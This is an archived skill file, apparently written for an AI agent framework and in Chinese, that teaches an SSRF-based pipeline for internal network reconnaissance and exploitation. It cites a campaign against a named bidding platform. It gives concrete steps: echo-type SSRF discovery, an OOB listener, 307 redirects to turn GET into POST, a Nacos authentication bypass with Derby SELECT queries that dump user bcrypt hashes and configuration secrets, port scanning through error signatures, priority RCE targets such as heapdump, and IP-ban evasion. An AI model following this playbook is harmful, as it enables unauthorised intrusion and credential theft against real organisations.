<!-- archived from /root/.hermes/skills/security/internal-ssrf-pivot/SKILL.md on 2026-10-21 -->

---
name: internal-ssrf-pivot
description: "内网取数:回显SSRF+OOB监听+Nacos Derby任意SELECT。触发:回显SSRF,OOB。"
version: 1.0.0
author: hermes-curator
metadata:
  hermes:
    tags: [pentest, ssrf, oob, nacos, internal-recon, java-platform]
    related_skills: [web-ssrf, middleware-unauth-family, ip-ban-bypass, remote-daemon-ops]
---

> 归档卡：原目录 `/root/.hermes/skills/security/internal-ssrf-pivot`。卡内 `references/…`、`scripts/…`、`templates/…` 均相对原目录；读取用 `read_file('/root/.hermes/skills/security/internal-ssrf-pivot/…')`，不要相对 `references/legacy/` 解析。

# 内网取数管线 (Internal SSRF Pivot)

**定位**:只能通过 SSRF 摸内网时,怎么把它做成"能读、能验、能持续"的侦察/利用管线。
2026-09 优智采系招标平台(zb.lyc.cn)全程实证:回显型原语 + 自建 OOB 监听 + Nacos 鉴权缺口 + Derby 任意 SELECT。

## When to Use

- 目标有 SSRF/取数类接口,要**读内网 HTTP 服务**(配置中心/中间件/管理台/内网 API)
- 只有盲 SSRF,要证明"服务端真能替我发请求"(XXE/OOB/RCE 外带的前置)
- 打到 Nacos 但端口不可直达,或已有 SSRF 想拿注册中心里的数据

## 1. 原语分级:先找回显型,它省掉整条 OCR 链

同一平台常有多条取数原语,**价值天差地别**:

| 原语形态 | 返回值 | 代价 |
|---|---|---|
| ⭐ **回显型**(`.../onlyofficeCallBackPreview?fileUrl=`、各类 `preview/callback/fetch/proxy` 端点) | **内网响应体原样返回**(Content-Length 与内网响应一致) | 极低:直接读正文 |
| 转换型(`convertUrl2Pdf` 类) | 只返回 PDF/文件 id,内容落对象存储 | 高:捞对象 + pdftoppm + tesseract OCR |

- **判定法**:把 `fileUrl` 指向自己的监听器,若接口返回的正文 = 监听器返回的正文 ⇒ 回显型成立
- **找法**:在 api-docs 里筛端点名 `preview|callback|fetch|proxy|download|convert|redirect|import`,逐个喂自己的 URL
- 平台会在目标 URL 后追加参数(实测 `&time=<epoch_ms>`)⇒ 自己的参数放最前,别以裸 `?` 结尾
- ⚠️ **Java 取数器不认 URL 里的 userinfo**(`http://u:p@host/`):Basic 认证型内网服务(ES/RabbitMQ 管理台)这样打不通,返回空体。
  ⚠️ **但「401/空体」不能反推「取数器不转发 userinfo」** —— 要判定就打自己的监听器、看收到的 `Authorization` 头(一发定死),
  别在 401 上反复换口令(类 curl 型取数器与 Java 型行为不同,别互相外推)。
- ★ **找原语的第二条路不是 api-docs,而是「配置里的 URL 字段」**:后台插件/集成/存储/迁移类配置的
  `api`/`url`/`endpoint` 字段,常配一个该插件自己的 `test`/`connect`/`detect` 接口;
  这类接口把服务端请求的**结果摘要回显**(`HTTP 404`/`Connection refused`/libcurl 原文错误)= 天然带回显 SSRF。
  读接口(`.../detail`)与写接口(`.../paramsUpdate`)常成对出现 ⇒ 写-触发-读回-**还原校验**闭环。
  触发用**空体**发(避开 WAF 查体)。
- ★ **取数器会往你的 URL 后拼固定路径/参数** ⇒ 用 `?` 把拼接物吃进查询串,真实路径由 `?` 之前决定
  (实测 `api=<目标路径>?z=`,拼接物落查询串);别以裸 `?` 结尾。
- ★ **内网黑名单按字面量写**:拦 `127.0.0.1` 的同一产品,自己的功能模块就用 `[::ffff:127.0.0.1]` 访问本机实例
  ⇒ 用 IPv6-mapped 等价写法绕过它自己的黑名单。

## 2. OOB 监听器:把"服务端能不能发请求"变成事实

模板直接跑: `scripts/oob_listener.py`(记录 method/path/headers/body + `302`/`307` 跳板 + XXE DTD 服务器 + `/leak` 收外带)。

常驻(跳板机上):
```bash
setsid nohup python3 oob_listener.py > oob.out 2>&1 </dev/null & echo $! > oob.pid
# 停: kill "$(cat oob.pid)"    ← 绝不用 pkill -f(会匹配到自己命令行而自杀,见 remote-daemon-ops)
```

**五个必须知道的坑**:

1. **监听器要 `HTTP/1.0` + `Connection: close`**:HTTP/1.1 keep-alive 会吊住取数客户端 → **平台接口整体超时**,看起来像"目标不通",其实是自己的锅
2. **端口只放 80**:云安全组通常只开 80;实测 8899/8080/4444/9000 目标侧不可达
3. **过滤公网噪音**:ECS 的 80 全天被扫,噪音 = 随机公网 IP + 浏览器 UA 打 `/`;真实取数方 = 内网出口 IP + 固定 UA(实测 `Mozilla/5.0 (X11; Linux x86_64, rv:102.0)` 与 `Java/1.8.0_212`)
4. **基线纪律(必守)**:每轮扫描都塞一条**已知可用**原语做对照。漏掉基线时"0 命中"无法区分"没有 SSRF"与"监听器/管线坏了"——本战役第一轮就因此白跑
5. **`302` 降级成 GET,`307` 保留原方法** ⇒ 找到"会 POST 到我们 URL"的组件(webhook/通知/callback)时,用 307 把它重定向向内网 POST 接口 = GET-only SSRF 升级成 POST

**method + body 就是答案**:日志里出现 `POST` = 找到通往一切**写**接口的门票。逐端点喂 URL 扫一遍(带 url/path/callback 参数的端点在 api-docs 里筛出来),看 method 落哪种。

## 3. Nacos:凭据走 query 参数过鉴权 + Derby 任意 SELECT

端口不可直达(内网 DNS 不解析)时用 SSRF 当跳板;鉴权用一个非直觉缺口绕掉:

```bash
GET http://<nacos>:8848/nacos/v1/cs/ops/derby?username=nacos&password=<pw>&sql=<urlencode(sql)>
# → {"code":200,"data":[{"USERNAME":"nacos","PASSWORD":"$2a$10$..."}]}
```

**四个坑(不知道就白打)**:

1. **凭据位置**:`username`/`password` 作为 **URL query 参数**有效;`http://u:p@host/` 形式**无效**
2. **自动追加分页尾巴**:端点把 SQL 拼成 `<sql> OFFSET 0 ROWS FETCH NEXT 1000 ROWS ONLY` ⇒ **SQL 结尾加 ` -- `** 注释掉尾巴(实测有效)
3. **只允许查询语句**:`CALL SQLJ.INSTALL_JAR(...)` → `{"code":500,"message":"Only query statements are allowed"}`。**Derby INSTALL_JAR/CREATE FUNCTION 这条 RCE 链在此端点不通**,别照老 writeup 硬怼;要写面去别处找 POST(见 §2.5)
4. **Derby 语法(不是 MySQL)**:`select 1` 非法(要有 FROM)→ 用 `select count(*) as c from <t> --`;分页用 `fetch first N rows only`;报错 `Encountered "OFFSET"` / `Encountered "<EOF>"` = 尾巴没注释干净或 select 缺 FROM

**只读配方**(先广后深):
```sql
select username,password from users --                                 -- 账号+bcrypt
select tenant_id,count(*) as c from config_info group by tenant_id --  -- 租户分布(只有 1 个租户=确认白标实例)
select tenant_id,data_id,group_id,content from config_info fetch first 40 rows only --
select ALIAS,ALIASINFO from sys.sysaliases --                          -- 有没有前任留下的 UDF(有=可直接执行)
```
配置正文里 grep `ssh|id_rsa|privateKey|secret|token|jdbc:mysql|192.168.|10.20.|admin` → 内网入口与凭据。
对方是 **Nacos 3.x** 时先试 v3 auth 作用域错配(见 `middleware-unauth-family`)。

## 4. 内网服务面枚举纪律

- 目标清单**从配置里抽**(`spring.application.name`、`http://host:port`、`*-service:port`),别手工猜
- **只报有内容的响应**:`200 + len=0` 通常是取数失败,不是"服务存在但空"
- **超时 ≠ 没暴露**:内网 IP 段(目标方自有机房 `192.168.x`)从 K8s pod 出不去就全超时——先跟已知可达目标(配置中心健康页)做对照再下结论,别把网络不可达写成"面很小"
- 固定扫高价值路径：`/actuator/{,env,heapdump,logfile,mappings}`、`/druid/index.html`、`/swagger-ui.html`、`/v3/api-docs`、`/jolokia/list`(Jolokia 的 GET exec 是已知 GET 型 RCE 链)
- ★★ **端口发现靠「错误签名」判服务类型,不看超时**(带回显 SSRF 即可当内网端口扫描器):

| 回显 | 含义 |
|---|---|
| `HTTP <code>`(401/403/302 都算) | 有 HTTP 服务:401=鉴权活着、403=白名单、302=跳转 |
| `Connection refused` | 端口闭 —— 据此确定**开放集** |
| `Empty reply from server` | 连通但**不先说话的非 HTTP 服务**(Redis/Memcached) |
| `Received HTTP/0.9 when not allowed` | 二进制握手先到(MySQL 类) |
| `wrong version number` | 用 `https://` 打了明文 HTTP 端口 ⇒ 换 `http://` |
| `Connection reset by peer` | 端口活但服务主动断(强制 HTTPS 的面板、只认特定 Host 的服务) |
| `Connection timed out` | 过滤 —— 别当「存在但静默」 |

  先扫常用端口拿开放集再定性;**存在即 RCE 的落点优先扫**:Docker `2375/2376`、actuator、Webmin `10000`、
  RabbitMQ 管理台 `15672`、Elasticsearch `9200`、WebLogic `7001`。全 refused 就是「无秒级 RCE 面」的结论(写进报告)。
- ★★ **先测协议支持,再投入 gopher/Redis 原生 RESP 这类 payload**:HTTP 客户端型取数器只认 http/https,
  非 http scheme 回 `Could not resolve: <scheme> (Misformatted domain name)` ⇒ **gopher 打 Redis 的整条 RCE 链在应用层判死**
  (不是 WAF、不是 curl 限制)。同理 `file://`/`dict://` 先测再规划 —— 别先写好 RESP payload 才去发现协议不支持。
- ⚠️ **内网管理面板(宝塔类)从 localhost 打只值一发判死**:明文 HTTP 被 reset(强制 HTTPS)⇒ 改 `https://`;
  回 `401` = 前置 **Basic 认证 + 面板登录两道墙**且全路径都 401 ⇒ 停在“需要口令”,
  **别在路径混淆(`//`、`/./`、`;`、编码)上耗时**;真要得手只有口令一条路(得手后建计划任务即 RCE)。
- `heapdump` 拿到就是金矿(私钥/DB 密码/会话),发现 actuator 开着优先拖它

## 5. Pitfalls

- **别把 OOB 当无限弹药**:监听器 + 扫描都是对外请求,烧的是跳板 IP;触发目标侧封禁后整套管线瞬间失效(处置见 `ip-ban-bypass` §4e)
- 别假设取数器会**转发自定义请求头**:实测只带自己的 UA ⇒ 用 `Authorization` 打 K8s API/管理面这条路是死的,别耗时间
- 只有 GET 原语时,先穷尽"**GET 就能读**"的高价值面(Nacos Derby / ES `_cat` / actuator/heapdump / 未授权控制台),再考虑找 POST
- XXE 别只在 OOXML 上试:Aspose 系导入器**不展开 DTD 实体**;换"能注入 XML 的接口"(工作流回调/导入类)才有戏,并用自己的 OOB 做外带 DTD

## 关联

- `web-ssrf`:SSRF 基础与地址绕过(本技能是它的"内网管线化"上层件)
- `ip-ban-bypass`:封禁判定与换出口(本技能的前置保障)
- `middleware-unauth-family`:中间件未授权家族
- `remote-daemon-ops`:跳板常驻进程管理(setsid/pidfile,不用 pkill -f)

实战配方(优智采系招标平台:回显原语 + 内网面 + Nacos Derby): `references/youzhicai-bidding-platform-2026-09.md`
